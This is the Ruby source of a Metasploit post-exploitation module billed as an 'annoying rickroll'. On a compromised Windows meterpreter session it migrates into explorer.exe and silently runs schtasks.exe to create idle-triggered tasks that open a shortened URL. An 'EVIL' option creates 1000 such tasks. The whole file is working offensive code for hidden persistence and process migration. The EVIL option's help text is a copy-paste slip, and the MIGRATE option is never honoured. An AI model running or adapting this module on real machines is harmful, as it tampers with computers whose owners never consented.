##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	
	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Annoying Rickroll!',
				'Description'   => %q{ This module's only purpose is to annoy users :) .},
				'License'       => BSD_LICENSE,
				'Author'        => [ 'Jonathan Cran <jcran[at]metasploit.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ],
				'References'    =>
					[
						[ 'URL', 'http://twitter.com/#!/hdmoore/status/54964008033333248' ]
					]
			))
		register_options(
			[
				OptBool.new('DISABLE',   [ false, 'Disable it.', false]),
                                OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', true]), 
                                OptBool.new('EVIL', [false, 'Automatically migrate to explorer.exe', false ])
			], self.class)

	end

	def run
		migrate 
			
		if datastore['DISABLE']
			print_status "Disabling rickroll..."
			if datastore['EVIL']
				1000.times do |i|
					disable_annoy("RRLOL",i)
				end
			else
				disable_annoy
			end
		else
			print_status "Enabling rickroll..."
			if datastore['EVIL']
				1000.times do |i|
					enable_annoy("RRLOL",i)
				end
			else
				enable_annoy
			end
		end
	end

	def enable_annoy(name="RRLOL",count=0)
		task_name = name + count.to_s
		target = "schtasks.exe /CREATE /TN #{task_name} /TR \"cmd.exe /c start http://bit.ly/idn29F\" /SC ONIDLE /I 1"
		print_status "Running #{target}"
		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
	end

	def disable_annoy(name="RRLOL",count=0)
		task_name = name + count.to_s
		target = "schtasks.exe /DELETE /F /TN #{task_name}"
		print_status "Running #{target}"
		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
	end
	
        def migrate(pid=nil)
                current_pid = session.sys.process.open.pid
                if pid != nil and current_pid != pid
                        #PID is specified
                        target_pid = pid
                        print_status("current PID is #{current_pid}. Migrating to pid #{target_pid}")
                        begin
                                session.core.migrate(target_pid)
                        rescue ::Exception => e
                                print_error(e)
                                return false
                        end
                else
                        #No PID specified, assuming to migrate to explorer.exe
                        target_pid = session.sys.process["explorer.exe"]
                        if target_pid != current_pid
                                @old_pid = current_pid
                                print_status("current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...")
                                begin
                                        session.core.migrate(target_pid)
                                rescue ::Exception => e
                                        print_error(e)
                                        return false
                                end
                        end
                end
                return true
        end

	
end
